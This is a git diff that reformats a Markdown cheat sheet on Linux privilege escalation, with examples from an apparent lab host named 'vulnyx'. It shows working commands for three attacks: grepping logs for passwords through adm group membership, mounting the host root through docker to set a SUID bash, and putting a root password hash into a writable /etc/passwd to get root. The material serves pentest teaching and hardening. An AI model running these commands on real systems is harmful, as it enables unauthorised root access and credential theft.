@@ -52,16 +52,12 @@ NhAAAAAwEAAQAAAQEAstkGmc1W+epM0w13VQrLO/wMNWwxFltotpa9elYJVXSlBc+PgF6I
 
 When a user is part of the `adm` **group**, he can **read log files** on the system.
 
-**Check Group**
-
-```
+```ruby
+# Check Group
 low@vulnyx:~$ id
 uid=1000(low) gid=1000(low) groups=1000(low),4(adm)
-```
 
-**Abuse Group**
-
-```ruby
+# Abuse Group
 low@vulnyx:~$ grep --color -Eri "pass|password|secret|db" /var/log 2>/dev/null
 ```
 
@@ -69,16 +65,12 @@ low@vulnyx:~$ grep --color -Eri "pass|password|secret|db" /var/log 2>/dev/null
 
 When a user is part of the `docker` **group**, they have the ability to **manage containers**.
 
-**Check Group**
-
-```
+```ruby
+# Check Group
 low@vulnyx:~$ id
 uid=1000(low) gid=1000(low) groups=1000(low),109(docker)
-```
 
-** Abuse Group**
-
-```ruby
+# Abuse Group
 low@vulnyx:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # chmod 4755 /bin/bash
 # exit
@@ -98,38 +90,26 @@ low@vulnyx:~$ /bin/bash -pi
 If a low-privileged user has permissions to write to the `/etc/passwd` file, an attacker can remove the `:x:` (on the `root` user line) and add a **hash**.  
 This will change the file where a user's authentication is performed, from being done through the `/etc/shadow` file to being done through the `/etc/passwd` file.
 
-**Check Permissions**
-
 ```ruby
+# Check Permissions
 low@vulnyx:~$ ls -l /etc/passwd
 -rw----rw- 1 root root 1395 abr 21 20:16 /etc/passwd
-```
 
-**Create Hash**
-
-```ruby
+# Create Hash
 root@kali:~# openssl passwd -1 "P@ssword123"
 $1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0
-```
 
-**Add Hash**
-
-```ruby
+# Add Hash
 # before
 low@vulnyx:~$ cat /etc/passwd |grep root
 root:x:0:0:root:/root:/bin/bash
-
 # after
 low@vulnyx:~$ cat /etc/passwd |grep root
 root:$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0:0:0:root:/root:/bin/bash
-```
 
-**Authenticate**
-
-```ruby
+# Authenticate
 low@vulnyx:~$ su -
 Password:
-
 root@vulnyx:~# id
 uid=0(root) gid=0(root) grupos=0(root)
 ```
